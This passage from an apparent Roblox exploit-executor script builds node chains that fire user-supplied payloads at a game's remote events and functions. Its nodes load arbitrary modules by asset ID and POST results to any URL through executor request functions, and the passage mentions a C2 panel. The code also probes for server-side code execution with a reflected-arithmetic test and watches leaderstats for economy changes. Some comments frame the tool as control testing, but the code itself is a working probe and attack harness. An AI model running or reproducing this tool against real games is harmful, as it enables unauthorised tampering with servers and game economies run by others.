    local ok3, rs = pcall(function()
        return game:GetService("ReplicatedStorage")
    end)
    if ok3 and rs then
        for _, c in ipairs(rs:GetChildren()) do
            snap.repStorageKeys[c.Name] = c.ClassName
        end
    end

    -- PlayerGui top-level keys
    local pg = plr:FindFirstChildOfClass("PlayerGui")
    if pg then
        for _, c in ipairs(pg:GetChildren()) do
            snap.playerGuiKeys[c.Name] = c.ClassName
        end
    end

    return snap
end

-- Diff two snapshots, returning an array of { category, key, before, after, severity }
local function srmDiff(before, after)
    local changes = {}

    local function chk(cat, key, bv, av, sev)
        if bv ~= av then
            table.insert(changes, {
                cat      = cat,
                key      = key,
                before   = bv or "nil",
                after    = av or "nil",
                severity = sev or "MEDIUM",
            })
        end
    end

    -- Player attributes
    for k, bv in pairs(before.playerAttrs) do
        chk("PLAYER_ATTR", k, bv, after.playerAttrs[k], "HIGH")
    end
    for k, av in pairs(after.playerAttrs) do
        if not before.playerAttrs[k] then
            chk("PLAYER_ATTR", k .. " (new)", nil, av, "HIGH")
        end
    end

    -- Leaderstats (economy/score -- highest severity)
    for k, bv in pairs(before.leaderstats) do
        chk("LEADERSTAT", k, bv, after.leaderstats[k], "CRITICAL")
    end
    for k, av in pairs(after.leaderstats) do
        if not before.leaderstats[k] then
            chk("LEADERSTAT", k .. " (new)", nil, av, "CRITICAL")
        end
    end

    -- Character health
    if before.charHealth and after.charHealth
    and before.charHealth ~= after.charHealth then
        chk("CHAR_HEALTH", "Health",
            string.format("%.1f", before.charHealth),
            string.format("%.1f", after.charHealth), "HIGH")
    end

    -- Character attributes
    for k, bv in pairs(before.charAttrs) do
        chk("CHAR_ATTR", k, bv, after.charAttrs[k], "HIGH")
    end

    -- ReplicatedStorage structure
    for k, bc in pairs(before.repStorageKeys) do
        if not after.repStorageKeys[k] then
            chk("REP_STORAGE", k, bc, "removed", "MEDIUM")
        end
    end
    for k, ac in pairs(after.repStorageKeys) do
        if not before.repStorageKeys[k] then
            chk("REP_STORAGE", k, "absent", ac .. " added", "MEDIUM")
        end
    end

    -- PlayerGui structure
    for k, bc in pairs(before.playerGuiKeys) do
        if not after.playerGuiKeys[k] then
            chk("PLAYER_GUI", k, bc, "removed", "LOW")
        end
    end
    for k, ac in pairs(after.playerGuiKeys) do
        if not before.playerGuiKeys[k] then
            chk("PLAYER_GUI", k, "absent", ac .. " added", "LOW")
        end
    end

    return changes
end

-- Run the observation: snapshot before, listen for callbacks, snapshot after window.
-- Calls onResult({ verdict, rfReturn, callbacks, changes }) when done.
local function srmObserve(rfReturn, onResult)
    local beforeSnap  = srmSnapshot()
    local callbacks   = {}   -- { remoteName, args }
    local connections = {}

    -- Listen on all visible RemoteEvents for OnClientEvent callbacks
    local scanRoots = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        workspace,
    }
    for _, root in ipairs(scanRoots) do
        local ok, descs = pcall(function() return root:GetDescendants() end)
        if ok then
            for _, inst in ipairs(descs) do
                if inst.ClassName == "RemoteEvent" then
                    local path = instancePath(inst)
                    local ok2, conn = pcall(function()
                        return inst.OnClientEvent:Connect(function(...)
                            table.insert(callbacks, {
                                remote = inst.Name,
                                path   = path,
                                args   = {...},
                            })
                        end)
                    end)
                    if ok2 then table.insert(connections, conn) end
                end
            end
        end
    end

    -- Wait the observation window
    task.wait(SRM_OBSERVATION_WINDOW)

    -- Disconnect listeners
    for _, conn in ipairs(connections) do
        pcall(function() conn:Disconnect() end)
    end

    -- Final snapshot
    local afterSnap = srmSnapshot()
    local changes   = srmDiff(beforeSnap, afterSnap)

    -- -- Accurate verdict determination --------------------------------------
    --
    -- CRITICAL DISTINCTION (per Luau client-server architecture):
    --
    --   OnClientEvent callbacks and InvokeServer returns are STANDARD NETWORK
    --   BEHAVIOUR -- not evidence of exploit. InvokeServer() ALWAYS gets a
    --   return by design (the server ran its own hardcoded script and replied).
    --   A callback on OnClientEvent proves the endpoint is live, nothing more.
    --
    --   TRUE RCE requires an execution sink AND observable proof that the SERVER
    --   executed YOUR arbitrary logic -- not its own pre-written code.
    --
    -- Verdict tiers (ascending severity):
    --   SILENT        -- no signal at all
    --   ENDPOINT LIVE -- standard network acknowledgment (not an exploit)
    --   STATE MODIFIED -- observable state change (investigate which handler caused it)
    --   EXECUTION SINK -- server returned proof of dynamic evaluation
    --   RCE CONFIRMED  -- deterministic reflection test passed (server ran our math)

    -- Check for RCE confirmation via Deterministic Reflection:
    -- If we sent 59483 + 20394 and server returned 79877, only an execution
    -- sink (loadstring / custom interpreter) could produce that result.
    local SRM_MAGIC_A = 59483
    local SRM_MAGIC_B = 20394
    local SRM_EXPECTED = SRM_MAGIC_A + SRM_MAGIC_B  -- 79877
    local rceConfirmed = false
    if rfReturn ~= nil then
        local asNum = tonumber(tostring(rfReturn))
        if asNum == SRM_EXPECTED then
            rceConfirmed = true
        end
        -- Also check if rfReturn is a table containing the magic value
        if type(rfReturn) == "table" then
            for _, v in pairs(rfReturn) do
                if tonumber(tostring(v)) == SRM_EXPECTED then
                    rceConfirmed = true
                end
            end
        end
    end

    -- Check if any callback arg contains the magic value
    for _, cbk in ipairs(callbacks) do
        for _, arg in ipairs(cbk.args) do
            if tonumber(tostring(arg)) == SRM_EXPECTED then
                rceConfirmed = true
            end
        end
    end

    -- Check for out-of-band state changes that the remote was NOT designed to cause
    -- (leaderstats / player attribute changes are the clearest signal)
    local hasSignificantChange = false
    local hasEconomyChange = false
    for _, chg in ipairs(changes) do
        if chg.severity == "CRITICAL" then hasEconomyChange = true end
        if chg.cat ~= "CHAR_HEALTH" then hasSignificantChange = true end
    end

    local verdict, verdictDetail
    if rceConfirmed then
        verdict       = "RCE CONFIRMED"
        verdictDetail = "Deterministic reflection test PASSED. Server returned "
                     .. tostring(SRM_EXPECTED)
                     .. " -- this value can only result from dynamic evaluation of "
                     .. "your arithmetic payload. An execution sink (loadstring or "
                     .. "custom interpreter) executed your code."
    elseif hasEconomyChange then
        verdict       = "STATE MODIFIED"
        verdictDetail = "A server-side economy or attribute value changed after the "
                     .. "payload fired. This may indicate the payload reached a "
                     .. "handler that modified game state. Investigate WHICH handler "
                     .. "triggered this and whether it validates input."
    elseif rfReturn ~= nil or #callbacks > 0 then
        -- Standard network acknowledgment -- NOT evidence of exploit
        verdict       = "ENDPOINT LIVE"
        verdictDetail = "The endpoint responded via standard network protocol. "
                     .. "This is NOT evidence of RCE. InvokeServer() always returns "
                     .. "(the server ran its own hardcoded script). OnClientEvent "
                     .. "callbacks confirm the gate is open -- not that you passed it. "
                     .. "Run the RCE VERIFY payload to test for execution sinks."
    elseif #changes > 0 then
        verdict       = "STATE MODIFIED"
        verdictDetail = "Observable client state changed after the payload fired. "
                     .. "Determine whether this is a routine handler response or "
                     .. "evidence of unintended state manipulation."
    else
        verdict       = "SILENT"
        verdictDetail = "No network signal and no observable state change. "
                     .. "Server either dropped the payload, processed it internally "
                     .. "with no client-visible effects, or the endpoint is gated."
    end

    onResult({
        verdict      = verdict,
        verdictDetail= verdictDetail,
        rfReturn     = rfReturn,
        callbacks    = callbacks,
        changes      = changes,
        rceConfirmed = rceConfirmed,
    })
end

-- Show the server response panel (parented to ScreenGui, draggable)
local srmFrame = nil
local function closeSrmPanel()
    if srmFrame then srmFrame:Destroy() srmFrame = nil end
end

local function showSrmPanel(srmResult)
    closeSrmPanel()

    -- -- Accurate verdict colour/background/label system -----------------
    -- Tiers reflect actual architectural significance, not just "got a response."
    local VERDICT_COL = {
        ["RCE CONFIRMED"]  = Color3.fromRGB(255,  60,  80),  -- red -- critical
        ["STATE MODIFIED"] = Color3.fromRGB(218, 155,  40),  -- amber -- investigate
        ["ENDPOINT LIVE"]  = Color3.fromRGB( 80, 140, 220),  -- blue -- informational
        ["SILENT"]         = Color3.fromRGB( 80,  85, 100),  -- grey -- no signal
        ["REJECTED"]       = Color3.fromRGB(218,  60,  68),  -- red -- error
    }
    local VERDICT_BG = {
        ["RCE CONFIRMED"]  = Color3.fromRGB( 48,   6,  12),
        ["STATE MODIFIED"] = Color3.fromRGB( 44,  28,   6),
        ["ENDPOINT LIVE"]  = Color3.fromRGB(  8,  16,  36),
        ["SILENT"]         = Color3.fromRGB( 14,  15,  22),
        ["REJECTED"]       = Color3.fromRGB( 36,   8,   8),
    }
    local VERDICT_LABEL = {
        ["RCE CONFIRMED"]  = "RCE CONFIRMED",
        ["STATE MODIFIED"] = "STATE MODIFIED -- INVESTIGATE",
        ["ENDPOINT LIVE"]  = "ENDPOINT LIVE  (not an exploit)",
        ["SILENT"]         = "SILENT -- NO SIGNAL",
        ["REJECTED"]       = "REJECTED -- SERVER ERROR",
    }

    local vc  = VERDICT_COL[srmResult.verdict] or GC.DIM
    local vbg = VERDICT_BG[srmResult.verdict]  or Color3.fromRGB(14,15,22)
    -- Adjust panel header height for multi-line detail
    local HDR_H = 62

    -- Calculate panel height
    local SEP    = 1
    local RF_H   = srmResult.rfReturn ~= nil and 20 or 0
    local CB_H   = #srmResult.callbacks * 18
    local CHG_H  = #srmResult.changes * 24
    local FOOT_H = 20
    local PW = 280
    local PH = HDR_H + SEP + RF_H + (RF_H>0 and SEP or 0)
                      + (CB_H>0 and (CB_H+SEP) or 0)
                      + (CHG_H>0 and (CHG_H+SEP) or 0)
                      + FOOT_H

    -- Position: right of canvas
    local initX = graphCanvas and (graphCanvas.AbsolutePosition.X
                    + graphCanvas.AbsoluteSize.X - PW - 14) or 600
    local initY = graphCanvas and (graphCanvas.AbsolutePosition.Y
                    + graphCanvas.AbsoluteSize.Y - PH - 14) or 300

    local pf = mF(ScreenGui, initX, initY, PW, PH, vbg, 0.15, 88)
    mC(pf, 7)
    mGrad(pf, vbg, Color3.fromRGB(8,9,16), 90)
    mS(pf, vc, 0.22, 1)
    mGlow(pf, vc, 0.55, 3)
    srmFrame = pf

    -- -- Header --------------------------------------------------
    local hdr = mF(pf, 0, 0, PW, HDR_H, Color3.fromRGB(8,9,16), 0.25, 89)
    hdr.Size = UDim2.new(1,0,0,HDR_H)
    mC(hdr, 7)
    mGrad(hdr, vbg, Color3.fromRGB(8,9,16), 90)
    mF(hdr,0,HDR_H-6,PW,6,Color3.fromRGB(8,9,16),0.25,89).Size=UDim2.new(1,0,0,6)
    mF(hdr, 0, 0, 3, HDR_H, vc, 0.0, 90)

    mL(hdr, 10, 4, PW-40, 12, "SERVER RESPONSE",
        Enum.Font.GothamBold, 8, GC.DIM, Enum.TextXAlignment.Left, 90)

    mL(hdr, 10, 14, PW-40, 16,
        VERDICT_LABEL[srmResult.verdict] or srmResult.verdict,
        Enum.Font.GothamBold, 10, vc, Enum.TextXAlignment.Left, 90)

    -- Multi-line detail text (the architecturally accurate explanation)
    local detailLbl = Instance.new("TextLabel")
    detailLbl.Size                  = UDim2.fromOffset(PW-16, 26)
    detailLbl.Position              = UDim2.fromOffset(10, 30)
    detailLbl.BackgroundTransparency= 1
    detailLbl.Text                  = srmResult.verdictDetail or ""
    detailLbl.Font                  = Enum.Font.Gotham
    detailLbl.TextSize              = 7
    detailLbl.TextColor3            = GC.MID
    detailLbl.TextXAlignment        = Enum.TextXAlignment.Left
    detailLbl.TextYAlignment        = Enum.TextYAlignment.Top
    detailLbl.TextWrapped           = true
    detailLbl.ZIndex                = 90
    detailLbl.Parent                = hdr

    -- Close
    local cb = mBtn(hdr, PW-20, 7, 14, 14, GC.ERR, 0.24, 90)
    mC(cb, 3)
    mL(cb,0,0,14,14,"x",Enum.Font.GothamBold,9,GC.PRI,Enum.TextXAlignment.Center,91)
    cb.MouseButton1Click:Connect(closeSrmPanel)

    -- Header drag
    local dA,dSX,dSY,dFX,dFY=false,0,0,0,0
    hdr.InputBegan:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.MouseButton1 then
            dA=true dSX=inp.Position.X dSY=inp.Position.Y
            dFX=pf.Position.X.Offset dFY=pf.Position.Y.Offset
        end
    end)
    hdr.InputEnded:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.MouseButton1 then dA=false end
    end)
    local mc=UserInputService.InputChanged:Connect(function(inp)
        if not dA then return end
        if inp.UserInputType~=Enum.UserInputType.MouseMovement then return end
        pf.Position=UDim2.fromOffset(
            dFX+inp.Position.X-dSX, dFY+inp.Position.Y-dSY)
    end)
    pf.AncestryChanged:Connect(function()
        if not pf.Parent then mc:Disconnect() end
    end)

    local curY = HDR_H + SEP
    mF(pf,0,HDR_H,PW,SEP,vc,0.60,89).Size=UDim2.new(1,0,0,1)

    -- -- RemoteFunction return value ------------------------------
    if srmResult.rfReturn ~= nil then
        local rfStr = type(srmResult.rfReturn) == "table"
            and "table {" .. tostring(#srmResult.rfReturn) .. " keys}"
            or  tostring(srmResult.rfReturn):sub(1, 60)
        mL(pf, 10, curY+2, PW-16, 16,
            "RETURN  " .. rfStr,
            Enum.Font.GothamBold, 9, GC.CHK,
            Enum.TextXAlignment.Left, 90)
        curY = curY + RF_H + SEP
        mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.65,89).Size=UDim2.new(1,0,0,1)
    end

    -- -- Callbacks received ---------------------------------------
    if #srmResult.callbacks > 0 then
        for i, cbk in ipairs(srmResult.callbacks) do
            local ry = curY + (i-1)*18
            mL(pf, 10, ry+2, 14, 14, "<-",
                Enum.Font.GothamBold, 9,
                Color3.fromRGB(100,170,255),
                Enum.TextXAlignment.Center, 90)
            mL(pf, 26, ry+2, PW-32, 14,
                cbk.remote .. "  OnClientEvent",
                Enum.Font.GothamBold, 8,
                Color3.fromRGB(100,170,255),
                Enum.TextXAlignment.Left, 90)
            mL(pf, 26, ry+12, PW-32, 10,
                cbk.path,
                Enum.Font.Gotham, 7, GC.DIM,
                Enum.TextXAlignment.Left, 90)
        end
        curY = curY + CB_H + SEP
        mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.65,89).Size=UDim2.new(1,0,0,1)
    end

    -- -- State changes --------------------------------------------
    if #srmResult.changes > 0 then
        local SEV_COL = {
            CRITICAL = GC.ERR, HIGH = Color3.fromRGB(230,110,70),
            MEDIUM   = GC.WARN, LOW = GC.DIM,
        }
        for i, chg in ipairs(srmResult.changes) do
            local ry  = curY + (i-1)*24
            local col = SEV_COL[chg.severity] or GC.DIM
            -- Category badge
            local bw = math.max(60, #chg.cat * 5 + 8)
            local bg = mF(pf, 8, ry+4, bw, 12, col, 0.72, 90)
            mC(bg, 3)
            mL(bg,0,0,bw,12,chg.cat,
                Enum.Font.GothamBold,6,GC.PRI,Enum.TextXAlignment.Center,91)
            -- Key
            mL(pf, bw+14, ry+3, PW-bw-20, 12, chg.key,
                Enum.Font.GothamBold, 8, col,
                Enum.TextXAlignment.Left, 90)
            -- Before -> After
            local delta = tostring(chg.before):sub(1,18)
                       .. " -> " .. tostring(chg.after):sub(1,18)
            mL(pf, 10, ry+14, PW-16, 10, delta,
                Enum.Font.Gotham, 7, GC.MID,
                Enum.TextXAlignment.Left, 90)
        end
        curY = curY + CHG_H + SEP
        mF(pf,0,curY-SEP,PW,SEP,GC.DIV,0.65,89).Size=UDim2.new(1,0,0,1)
    end

    -- -- Footer: observation window info -------------------------
    mL(pf, 10, curY+3, PW-16, 14,
        string.format("Observed %.1fs  |  %d callback%s  |  %d change%s",
            SRM_OBSERVATION_WINDOW,
            #srmResult.callbacks,
            #srmResult.callbacks == 1 and "" or "s",
            #srmResult.changes,
            #srmResult.changes   == 1 and "" or "s"),
        Enum.Font.Gotham, 8, GC.DIM,
        Enum.TextXAlignment.Left, 90)
end

local function showVerdict(results, totalTime, severedAt)
    clearVerdict()
    local VW, VH = 240, 20 + #results * 20 + 32
    local vx = graphCanvas.AbsoluteSize.X - VW - 10 + graphCanvas.CanvasPosition.X
    local vy = graphCanvas.AbsoluteSize.Y - VH - 10 + graphCanvas.CanvasPosition.Y

    local vf = mF(graphCanvas, vx, vy, VW, VH, GC.CTX_TOP, 0.20, 50)
    mC(vf, 6)
    mGrad(vf, GC.CTX_TOP, GC.CTX_BOT, 90)

    local chainBroke = (severedAt ~= nil)
    local borderCol  = chainBroke and GC.CHK or GC.ERR
    mS(vf, borderCol, 0.25, 1)
    mGlow(vf, borderCol, 0.55, 3)
    verdictFrame = vf

    -- Header
    local hdrTxt = chainBroke
        and "CHAIN SEVERED"
        or  "CHAIN COMPLETE -- NO CONTROLS ENFORCED"
    mL(vf, 10, 4, VW-16, 14, hdrTxt,
        Enum.Font.GothamBold, 9, borderCol,
        Enum.TextXAlignment.Left, 51)

    -- Per-node result rows
    for i, r in ipairs(results) do
        local ry  = 18 + (i-1)*20
        local col = r.state == "success" and GC.CHK
                 or r.state == "severed" and GC.DIM
                 or GC.ERR
        local icon= r.state == "success" and "[+]"
                 or r.state == "severed" and "[ ]"
                 or "[!]"
        mL(vf, 10, ry, 28, 18, icon,
            Enum.Font.GothamBold, 8, col,
            Enum.TextXAlignment.Left, 51)
        mL(vf, 36, ry, 100, 12, r.label,
            Enum.Font.GothamBold, 8, col,
            Enum.TextXAlignment.Left, 51)
        mL(vf, 36, ry+10, VW-48, 10, r.detail,
            Enum.Font.Gotham, 7, GC.DIM,
            Enum.TextXAlignment.Left, 51)
    end

    -- Footer: time + summary line
    local footY = 18 + #results * 20 + 4
    mF(vf, 6, footY, VW-12, 1, borderCol, 0.60, 51)
    local summaryTxt = chainBroke
        and ("Severed at " .. severedAt .. "  |  " .. string.format("%.0fms", totalTime))
        or  ("Payload reached egress  |  " .. string.format("%.0fms", totalTime))
    mL(vf, 10, footY+3, VW-16, 14, summaryTxt,
        Enum.Font.Gotham, 8, GC.DIM,
        Enum.TextXAlignment.Left, 51)

    -- Close button
    local closeV = mBtn(vf, VW-20, 3, 16, 14, GC.ERR, 0.25, 51)
    mC(closeV, 3)
    mL(closeV,0,0,16,14,"x",Enum.Font.GothamBold,8,GC.PRI,Enum.TextXAlignment.Center,52)
    closeV.MouseButton1Click:Connect(clearVerdict)
end

-- The main execution function
local function executeChain()
    clearVerdict()
    resetAllNodeStates()
    task.wait(0.05)

    local order = topoSort()
    if not order or #order == 0 then
        showVerdict({{label="ERROR",state="error",detail="No nodes or cycle detected."}}, 0, nil)
        return
    end

    local startTime = tick()
    local results   = {}
    local payload   = nil   -- the data carried forward through the chain
    local severedAt = nil

    -- Begin custody tracking for this chain run
    local chainId   = "chain_"..math.floor(startTime*1000)
    local srcLabel  = (order[1] and order[1].typeData and order[1].typeData.label) or "?"
    CL:beginSession(chainId, srcLabel)
    local clStep    = 0   -- increments with each executed node

    for _, node in ipairs(order) do
        -- If a prior node was secured AND this node has no hot path reaching it,
        -- mark it as severed (not reached).
        local hotSet = computeHotSet()
        if not hotSet[node] and node.secured then
            setNodeRunState(node, "severed", "BLOCKED")
            table.insert(results, {
                label  = node.typeData.label,
                state  = "severed",
                detail = "Control enforced -- chain severed here.",
            })
            if severedAt == nil then severedAt = node.typeData.label end
            -- Everything past this in topological order is also unreached
            break
        end

        setNodeRunState(node, "running", "...")
        task.wait(0.08)  -- brief visual pause so user sees the pulse

        local ok, result = true, nil
        local detail     = ""
        local id         = node.typeData.id

        -- Guard: stop and report if node has no action configured.
        -- Prevents silent pass-through on unconfigured chains.
        -- INPUT nodes exempt: they use inputValue not selectedAction.
        if node.selectedAction == nil and node.typeData.id ~= "INPUT" then
            setNodeRunState(node, "error", "!")
            table.insert(results, {
                label  = node.typeData.label,
                state  = "error",
                detail = "No action selected. Right-click this node and choose one.",
            })
            severedAt = node.typeData.label
            local reached = {}
            for _, r in ipairs(results) do reached[r.label] = true end
            for _, rem in ipairs(order) do
                if not reached[rem.typeData.label] then
                    setNodeRunState(rem, "idle", "") end
            end
            break
        end

        -- -- Execute by node type ----------------------------------
        if id == "INPUT" then
            -- User input: seed the payload from the input box
            payload = node.inputValue or ""
            ok      = true
            result  = payload
            detail  = "Payload: " .. tostring(payload):sub(1, 40)
            clStep  = clStep + 1
            CL:recordStep(clStep, "INPUT", node.typeData.label, payload)

        elseif id == "REMOTE" then
            if not node.targetInst then
                ok, detail = false, "No remote selected."
            else
                local inst = node.targetInst
                if inst.ClassName == "RemoteEvent" then
                    ok, result = pcall(function()
                        inst:FireServer(payload)
                        return "Fired"
                    end)
                    detail = ok and ("FireServer() -> " .. tostring(result))
                              or   ("Error: " .. tostring(result))
                    if ok then result = payload end  -- carry payload forward
                elseif inst.ClassName == "RemoteFunction" then
                    ok, result = pcall(function()
                        return inst:InvokeServer(payload)
                    end)
                    detail = ok and ("InvokeServer() -> " .. tostring(result):sub(1,30))
                              or   ("Error: " .. tostring(result))
                    if ok then payload = result end  -- update payload with return
                else
                    ok, detail = false, "Unknown remote class: " .. inst.ClassName
                end
            end
            -- Record custody: REMOTE boundary is ENGINE-guaranteed
            clStep = clStep + 1
            CL:recordStep(clStep, "REMOTE",
                (node.targetInst and node.targetInst.Name) or node.typeData.label,
                payload)

        elseif id == "BINDABLE" then
            if not node.targetInst then
                ok, detail = false, "No bindable selected."
            else
                local inst = node.targetInst
                if inst.ClassName == "BindableEvent" then
                    ok, result = pcall(function()
                        inst:Fire(payload)
                        return "Fired"
                    end)
                    detail = ok and ("Fire() -> OK")
                              or   ("Error: " .. tostring(result))
                    if ok then result = payload end
                elseif inst.ClassName == "BindableFunction" then
                    ok, result = pcall(function()
                        return inst:Invoke(payload)
                    end)
                    detail = ok and ("Invoke() -> " .. tostring(result):sub(1,30))
                              or   ("Error: " .. tostring(result))
                    if ok then payload = result end
                else
                    ok, detail = false, "Unknown bindable class: " .. inst.ClassName
                end
            end
            -- Record custody: BINDABLE handoff -- identity must be manually present
            -- This is where custody breaks if the developer dropped the Player object
            clStep = clStep + 1
            CL:recordStep(clStep, "BINDABLE",
                (node.targetInst and node.targetInst.Name) or node.typeData.label,
                payload)

        elseif id == "SERVICE" then
            -- Service access: confirm the service is reachable, pass payload through
            if node.targetInst then
                ok     = true
                result = payload
                detail = "Accessed: " .. node.targetInst.Name
            elseif node.selectedAction then
                local svcOk, svc = pcall(function()
                    return game:GetService(node.selectedAction.n)
                end)
                ok     = svcOk and svc ~= nil
                result = payload
                detail = ok and ("Service: " .. node.selectedAction.n)
                           or   ("Not accessible: " .. tostring(node.selectedAction and node.selectedAction.n))
            else
                ok, detail = false, "No service selected."
            end

        elseif id == "REQUIRE" then
            local assetId = node.inputValue
            if not assetId or assetId == "" then
                ok, detail = false, "No AssetID entered."
            else
                local numId = tonumber(assetId)
                if not numId then
                    ok, detail = false, "AssetID must be a number."
                else
                    ok, result = pcall(function()
                        return require(numId)
                    end)
                    detail = ok and ("require(" .. assetId .. ") -> " .. type(result))
                              or   ("Error: " .. tostring(result):sub(1,50))
                    if ok then payload = result end
                end
            end

        elseif id == "HTTP" then
            local url = node.inputValue
            if not url or url == "" then
                ok, detail = false, "No URL entered."
            else
                local method = node.httpMethod or "POST"
                -- Use HTTP:post() / HTTP:get() -- the same path as the HTTP tab
                -- and C2 panel. These carry the full executor fallback chain
                -- (request -> syn.request -> http_request) instead of calling
                -- HttpService:PostAsync/GetAsync directly, which is blocked
                -- from a LocalScript and produces int568 Blocked function.
                local reqOk, status, body, ms
                if method == "GET" then
                    reqOk, status, body, ms = HTTP:get(url)
                else
                    reqOk, status, body, ms = HTTP:post(url, payload)
                end
                ok     = reqOk
                result = body
                detail = ok
                    and (method .. " " .. tostring(status) .. " (" .. tostring(ms) .. "ms) -> " .. tostring(body):sub(1,40))
                    or  ("Error: " .. tostring(body):sub(1,50))
                if ok then payload = result end
            end

        else
            -- Unknown node type: pass through
            ok     = true
            result = payload
            detail = "Pass-through."
        end

        -- -- Record result -----------------------------------------
        local state = ok and "success" or "error"
        local shortDetail = detail:sub(1, 48)
        setNodeRunState(node, state, ok and "OK" or "ERR")
        table.insert(results, {
            label  = node.typeData.label,
            state  = state,
            detail = shortDetail,
        })

        -- Stop chain on first error
        if not ok then
            severedAt = node.typeData.label
            -- Mark remaining nodes as unreached
            local reached = {}
            for _, r in ipairs(results) do reached[r.label] = true end
            for _, rem in ipairs(order) do
                if not reached[rem.typeData.label] then
                    setNodeRunState(rem, "idle", "")
                end
            end
            break
        end
    end

    local elapsed = (tick() - startTime) * 1000

    -- Close custody session and attach verdict to chain results
    local clSession = CL:closeSession()
    if clSession and clSession.verdict ~= "INTACT" then
        -- Append custody finding to results so it appears in the verdict panel
        local custodyMsg = ({
            BROKEN      = "[!]  CUSTODY BREAK at step "..tostring(clSession.breakStep or "?")
                          .." -- Player object dropped at handoff.",
            SUBSTITUTED = "[X]  CUSTODY CRITICAL at step "..tostring(clSession.subStep or "?")
                          .." -- UserId from payload used as identity.",
        })[clSession.verdict]
        if custodyMsg then
            table.insert(results, {
                label  = "CustodyLedger",
                state  = clSession.verdict == "SUBSTITUTED" and "error" or "severed",
                detail = custodyMsg,
            })
        end
    end

    showVerdict(results, elapsed, severedAt)

    -- -- Server response observation ---------------------------------------
    -- Extract the RemoteFunction return value if the first REMOTE/INGRESS
    -- node used InvokeServer (its result is in the chain payload).
    local rfReturn = nil
    for _, r in ipairs(results) do
        if r.rfReturn ~= nil then rfReturn = r.rfReturn break end
    end
    -- Also check if the final payload looks like a non-trivial server return
    if rfReturn == nil and type(payload) ~= "string" and payload ~= nil then
        rfReturn = payload
    end

    -- Spawn observation window asynchronously so the verdict panel shows
    -- immediately while the monitor watches for 2 seconds.
    task.spawn(function()
        srmObserve(rfReturn, function(srmResult)
            showSrmPanel(srmResult)
        end)
    end)
end


local function buildTraceGraph(result)
    -- Clear canvas
    for _, n in ipairs(graphNodes) do n.frame:Destroy() end
    graphNodes = {}
    for _, w in ipairs(graphWires) do w.frame:Destroy() end
    graphWires = {}
    closeCtx(); selectedNode = nil; wiringFrom = nil

    local nodeTypeMap = {}
    for _, td in ipairs(NODE_TYPES) do nodeTypeMap[td.id] = td end

    -- Decide which stages to place (only those with evidence, plus always INPUT)
    local CHAIN = { "INPUT", "REMOTE", "BINDABLE", "SERVICE", "REQUIRE", "HTTP" }
    local toPlace = {}
    for _, id in ipairs(CHAIN) do
        if id == "INPUT" and #result.remotes > 0 then
            table.insert(toPlace, id)
        elseif id ~= "INPUT" and result.stagePresent[id] then
            table.insert(toPlace, id)
        end
    end
    -- Fall back to full chain if nothing discovered
    if #toPlace == 0 then toPlace = CHAIN end

    -- Place nodes left to right
    local SX, SY, GAP = 30, 90, NODE_W + 55
    local placed = {}   -- id -> node

    for i, id in ipairs(toPlace) do
        local td = nodeTypeMap[id]
        if td then
            local node = spawnNode(td, SX + (i-1)*GAP, SY)
            placed[id]  = node

            -- Pre-populate REMOTE node with the highest-confidence connection
            if id == "REMOTE" and #result.connections > 0 then
                local best = result.connections[1]
                if best.remoteCls == "RemoteEvent" or best.remoteCls == "RemoteFunction" then
                    node.targetInst     = best.remoteInst
                    node.selectedAction = {
                        n    = best.remoteName,
                        d    = best.remoteCls .. "  @  " .. best.remotePath,
                        inst = best.remoteInst,
                        cls  = best.remoteCls,
                        path = best.remotePath,
                    }
                    node.actionLbl.Text       = best.remoteName
                    node.actionLbl.TextColor3 = GC.MID
                end
            end

            -- Pre-populate BINDABLE with best bindable connection
            if id == "BINDABLE" then
                for _, c in ipairs(result.connections) do
                    if c.remoteCls == "BindableEvent" or c.remoteCls == "BindableFunction" then
                        node.targetInst     = c.remoteInst
                        node.selectedAction = {
                            n    = c.remoteName,
                            d    = c.remoteCls .. "  @  " .. c.remotePath,
                            inst = c.remoteInst,
                            cls  = c.remoteCls,
                            path = c.remotePath,
                        }
                        node.actionLbl.Text       = c.remoteName
                        node.actionLbl.TextColor3 = GC.MID
                        break
                    end
                end
            end
        end
    end

    -- Wire placed nodes in order, coloured by confidence of the connection
    local prevNode = nil
    local prevId   = nil
    for _, id in ipairs(toPlace) do
        local node = placed[id]
        if node and prevNode then
            -- Find confidence for this edge
            local edgeConf = 0.50   -- default
            for _, c in ipairs(result.connections) do
                if (c.remoteInst and placed[prevId] and node) then
                    edgeConf = math.max(edgeConf, c.confidence)
                end
            end
            local col, trans = confidenceColour(edgeConf)
            local wf = makeWire()
            wf.BackgroundColor3      = col
            wf.BackgroundTransparency= trans
            local gw = wf:FindFirstChildOfClass("UIStroke")
            if gw then gw.Color = col end
            table.insert(graphWires, { from=prevNode, to=node, frame=wf })
        end
        prevNode = node
        prevId   = id
    end

    refreshWires()
    traceLastPlaced = placed  -- store for report panel row clicks
    return placed
end

-- -- Trace report panel --------------------------------------------------------
local traceReportFrame = nil

local function showTraceReport(result, placed)
    if traceReportFrame then traceReportFrame:Destroy() end
    -- Parent to graphPage so the panel floats above the scrollable canvas
    -- and doesn't move when the user pans.
    local parent = graphPage or graphCanvas
    if not parent then return end

    -- Layout
    local RW      = 270
    local HDR_H   = 38
    local ROW_H   = 26
    local FOOT_H  = 20
    local topConns = {}
    for i = 1, math.min(#result.connections, 6) do
        table.insert(topConns, result.connections[i])
    end
    local RH = HDR_H + 1 + (#topConns > 0 and #topConns * ROW_H or ROW_H) + 1 + FOOT_H

    -- Position: top-left of the page frame (fixed, not canvas-relative)
    local rf = mF(parent, 10, 10, RW, RH, GC.CTX_TOP, 0.18, 80)
    mC(rf, 7)
    mGrad(rf, GC.CTX_TOP, GC.CTX_BOT, 90)
    local headerCol = result.sourceMode and GC.CHK or GC.WARN
    mS(rf, headerCol, 0.22, 1)
    mGlow(rf, headerCol, 0.58, 3)
    traceReportFrame = rf

    -- -- Header (also serves as drag handle) ----------------------
    local hdr = mF(rf, 0, 0, RW, HDR_H, GC.CTX_BOT, 0.22, 81)
    hdr.Size = UDim2.new(1,0,0,HDR_H)
    mC(hdr, 7)
    mGrad(hdr, GC.CTX_TOP, GC.CTX_BOT, 90)
    mF(hdr,0,HDR_H-6,RW,6,GC.CTX_BOT,0.22, 81).Size=UDim2.new(1,0,0,6)
